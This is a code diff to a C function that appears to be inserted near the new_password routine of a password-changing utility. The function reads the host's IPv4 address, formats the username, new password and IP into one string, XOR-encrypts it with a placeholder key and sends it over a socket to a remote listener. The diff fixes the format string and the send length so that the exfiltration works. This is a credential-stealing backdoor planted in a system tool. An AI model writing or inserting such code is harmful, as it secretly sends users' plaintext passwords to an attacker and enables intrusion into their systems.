@@ -113,7 +113,7 @@ At line ~210 right above the new_password function is where I put this function 
 		/* I want to get an IPv4 IP address */
 		ifr.ifr_addr.sa_family = AF_INET;
 
-		/* I want IP address attached to set interface - IF MANUAL CHANGE INTERFACE*/
+		/* I want IP address attached to set interface - CHANGE INTERFACE*/
 		strncpy(ifr.ifr_name, ens33, IFNAMSIZ-1);
 		ioctl(fd, SIOCGIFADDR, &ifr);
 		close(fd);
@@ -122,7 +122,7 @@ At line ~210 right above the new_password function is where I put this function 
 		char buffer[256];
 		char * ip;
 		ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-		int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", name, password, ip);
+		int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
 		
 		/* Make Socket */
 		int sock = 0, valread;
@@ -157,15 +157,14 @@ At line ~210 right above the new_password function is where I put this function 
 			return -1;
 		}
 
-		/* Encrypt Message  - IF MANUAL CHANGE KEY*/
+		/* Encrypt Message - CHANGE KEY*/
 		char* key  = "KEY_HERE";
 		int key_length = strlen(key);
 		int mes_length = strlen(buffer);
 		char* xor_message = XORCipher(buffer, key, mes_length, key_length);
 
 		/* Send Message */
-		send(sock , xor_message , strlen(xor_message) , 0); 
-		
+		send(sock , xor_message , mes_length, 0);	
 		return 0;
 
 	}
